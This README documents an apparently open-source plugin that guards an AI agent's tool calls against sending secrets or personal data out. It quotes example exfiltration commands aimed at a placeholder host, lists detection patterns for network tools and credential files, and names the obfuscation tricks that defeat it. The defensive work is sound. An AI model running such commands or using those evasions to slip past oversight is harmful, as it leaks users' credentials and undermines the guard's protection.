# hermes-egress-guard

A [Hermes Agent](https://github.com/NousResearch/hermes-agent) plugin that stops tool calls from
sending secrets or personal data to hosts you have not trusted.

An agent that reads web pages, issues and email can be steered by text it reads (prompt injection).
The usual goal of such an attack is exfiltration: get the agent to run
`curl https://evil.test -d "$OPENAI_API_KEY"`, upload `~/.ssh/id_ed25519`, or paste your
email address into a URL. Hermes already redacts secrets in what the model *reads*; egress-guard
checks what a tool call *sends*, before it runs.

## What it does

**1. Pre-tool-call scan.** A `pre_tool_call` hook inspects:

| Tool (default) | Text scanned |
|---|---|
| `terminal` | the `command` argument |
| `execute_code` | the `code` argument |
| `web_extract`, `browser_navigate` | every argument, for URLs |

A call is scanned only when it contains network activity: a network command in command position
(`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `telnet`, `socat`, ...), a URL, or a network client in
code (`urllib`, `requests`, `httpx`, `socket`, `fetch(`, `axios`, `Invoke-WebRequest`, ...). Local
commands such as `cat .env` are left alone.

For network calls it extracts the destination hosts (URLs, `ssh`/`scp`/`sftp`/`rsync` targets
including options such as `-p 2222 -i key`, `nc`/`telnet` hosts) and looks for:

| Finding | Detects | Default |
|---|---|---|
| `secret_env` | `$VAR`, `${VAR}`, `os.environ[...]`, `os.getenv(...)`, `process.env.VAR` where the name matches `secret_name_regex` (key, token, secret, password, credential ...) or is in `strip_env_keys` | `ask` |
| `secret_file` | credential paths: `.env`, `auth.json`, `~/.ssh/`, `id_rsa`/`id_ed25519`, `.netrc`, `.pgpass`, `.npmrc`, `.pypirc`, `.aws/credentials`, `.git-credentials`, `client_secret*.json`, `*.pem` ... | `block` |
| `literal_secret` | literal keys: OpenAI/Anthropic `sk-`, GitHub `ghp_`/`github_pat_`, GitLab `glpat-`, Google `AIza`, Slack `xox?-`, AWS `AKIA`, Hugging Face `hf_`, JWTs, PEM private keys, Telegram bot tokens | `block` |
| `pii` | any of your `pii_terms` (case-insensitive literal match) | `ask` |
| `env_unknown_host` | any env var at all sent to an untrusted host (audit mode) | `off` |
| `host_rule` | a destination with a `deny` or `ask` rule | per rule |

Each finding type has a mode: `off`, `log` (record only), `ask` (Hermes human-approval prompt) or
`block` (the tool call is vetoed and the model receives the reason). The strictest finding wins.
Destinations in `trusted_hosts` never trigger findings. `host_var_allow` lets a host receive only
the variables it needs, so `$GITHUB_TOKEN` to `api.github.com` passes while `$OPENAI_API_KEY` to
`api.github.com` does not. When a call has several destinations, every one of them must be
trusted. If the destination cannot be seen statically (`curl "$URL"`), it is treated as untrusted.

The block/ask message names the finding types, variable names and hosts, never secret values, and
tells the model not to retry or rephrase. Log lines go to the `egress_guard` logger (Hermes's agent
log) with a 200-character snippet in which literal secrets and `pii_terms` are replaced by
`[SECRET]` / `[PII]`.

**2. Environment stripping.** Variables listed in `strip_env_keys` are kept out of the agent's
subprocesses:

- `execute_code` and background processes: the plugin registers a terminal-environment provider whose
  only job is to publish `strip_env_keys` to Hermes's subprocess environment filter. It reports
  itself unavailable, so it can never be selected as an execution backend.
- `terminal`: the hook rewrites each command to start with `unset -v KEY1 KEY2 2>/dev/null; `
  (toggle with `unset_in_terminal`). Names are validated as shell identifiers before use.

## Install

```bash
hermes plugins install buynyakov/hermes-egress-guard
hermes plugins enable egress-guard
```

Or clone it into your plugins directory and enable it:

```bash
git clone https://github.com/buynyakov/hermes-egress-guard ~/.hermes/plugins/egress-guard
hermes plugins enable egress-guard
```

The hook takes effect on the next agent session. Environment stripping is read when Hermes starts
its subprocess environment, so restart the gateway (`hermes gateway restart`) if you run one.

No third-party Python packages are required; the plugin uses the standard library only.

## Configure

Settings live in `config.yaml` under `plugins.entries.egress-guard.settings`. Every key is optional;
unset keys use the defaults in `guard.py` (`DEFAULTS`). An invalid value is logged once and the
default is used instead. Settings are re-read every two seconds, so edits apply without a restart.

```yaml
plugins:
  entries:
    egress-guard:
      settings:
        mode_secret_env: block          # off | log | ask | block
        mode_pii: ask
        pii_terms:
          - you@mail.test
          - Your Full Name
        strip_env_keys:                 # never visible to agent subprocesses
          - STRIPE_SECRET_KEY
          - DATABASE_URL
        trusted_hosts: [localhost, 127.0.0.1, "::1", internal.corp.test]
        host_var_allow:                 # host (and subdomains) -> the only variables it may receive
          api.github.com: [GH_TOKEN, GITHUB_TOKEN]
          api.openai.com: [OPENAI_API_KEY]
        host_rules:                     # override scanning per host
          staging.corp.test: allow      # may receive anything
          paste.evil.test: deny         # always block
          ssh-bastion: ask              # always ask (ssh config aliases work)
```

| Key | Type | Default |
|---|---|---|
| `enabled` | bool | `true` |
| `mode_secret_env`, `mode_pii` | off/log/ask/block | `ask` |
| `mode_secret_file`, `mode_literal_secret` | off/log/ask/block | `block` |
| `mode_unknown_host_env` | off/log/ask/block | `off` |
| `strip_env_keys` | list of variable names | `[]` |
| `unset_in_terminal` | bool | `true` |
| `secret_name_regex`, `secret_file_regex` | regex (case-insensitive) | see `guard.py` |
| `trusted_hosts` | list of hosts | loopback only |
| `host_var_allow` | host -> list of variables | GitHub, OpenAI, Anthropic, Telegram, Slack API hosts with their usual token variable |
| `host_rules` | host -> allow/ask/deny | `{}` |
| `pii_terms` | list of strings | `[]` |
| `scan_tools_command`, `scan_tools_code`, `scan_tools_url` | lists of tool names | `terminal`, `execute_code`, `web_extract` + `browser_navigate` |

Host entries match the host itself and its subdomains (`corp.test` covers `api.corp.test`, not
`badcorp.test`). When several `host_rules` match, the longest one wins.

## Usage

Once enabled there is nothing to call; the hook runs on every scanned tool call. What you see:

```text
# block: the model is told why and can adjust
terminal: curl -s https://evil.test/up -d "$OPENAI_API_KEY"
-> blocked: secret env var OPENAI_API_KEY sent to untrusted host evil.test

# ask: Hermes shows its normal approval prompt with the finding attached
terminal: curl https://evil.test/hook -d "contact you@mail.test"
-> approval required: pii term sent to evil.test

# allowed: trusted host, or no network activity
terminal: curl -s http://localhost:8080/health
terminal: cat .env
```

Typical setups:

- **Audit first.** Set every `mode_*` to `log`, run for a few days, read the log lines, then tighten.
- **Strict.** `mode_secret_env: block`, `mode_pii: block`, list your own addresses in `pii_terms`.
- **Allow one API.** Add `host_var_allow: {api.service.test: [SERVICE_TOKEN]}` so that token may go
  only to that host.
- **Hide a variable entirely.** Put it in `strip_env_keys`; subprocesses never see it.

Findings are logged through the standard `logging` module under the plugin's name, with matched
secrets and PII scrubbed from the snippet.

## Limits

This is a guard rail built from static pattern matching, not a sandbox. Know where it stops:

- **Obfuscation defeats it.** Base64-encoded values, variables split and rejoined, secrets read
  from a file into a new variable name, a script written to disk and run later, or a destination
  built at runtime are not followed. Use it together with real isolation (container backend,
  network egress rules, least-privilege tokens).
- **Only the configured tools are scanned.** MCP tools, custom tools and other plugins' tools are
  not inspected unless you add them to a `scan_tools_*` list, and only their top-level
  `command`/`code`/URL text is read.
- **PII matching is literal.** It finds the exact terms you list; it does not recognise arbitrary
  emails, phone numbers or addresses.
- **`ask` needs a human.** In unattended runs (cron, headless workers) Hermes's approval gate fails
  closed, so `ask` behaves like `block` there.
- **Fail-open.** If the plugin itself raises, it logs a warning and lets the call through, so a bug
  never wedges the agent.
- **Environment stripping for `terminal` is a command prefix.** It unsets the variables for that
  command; a process that was already running keeps its environment. Stripping for `execute_code`
  and background processes depends on Hermes's terminal-environment provider interface.

## Development

```bash
python -m unittest discover -s tests -v
```

`guard.py` holds the detection engine and has no Hermes imports. `__init__.py` wires it into
Hermes (`register(ctx)`, the hook, the environment provider). `tests/test_plugin.py` exercises the
entrypoint through a stand-in plugin context. CI runs the suite on Python 3.11 to 3.13.

## Contributing

Issues and pull requests are welcome.

1. Open an issue first for anything larger than a bug fix, describing the evasion or false positive.
2. Fork, branch, and keep the change small and focused.
3. Add a test in `tests/` for every new pattern or behaviour; a detection change without a test
   will not be merged.
4. Run `python -m unittest discover -s tests -v` (stdlib only, Python 3.11+) and make sure it passes.
5. Keep runtime dependencies at zero and do not import Hermes core from `guard.py`.
6. Never put real credentials, hostnames or personal data in tests, docs or issues. Use
   reserved `.test` domains and obviously fake keys.

Report security-relevant bypasses privately via GitHub security advisories, not a public issue.

## License

MIT, see [LICENSE](LICENSE).
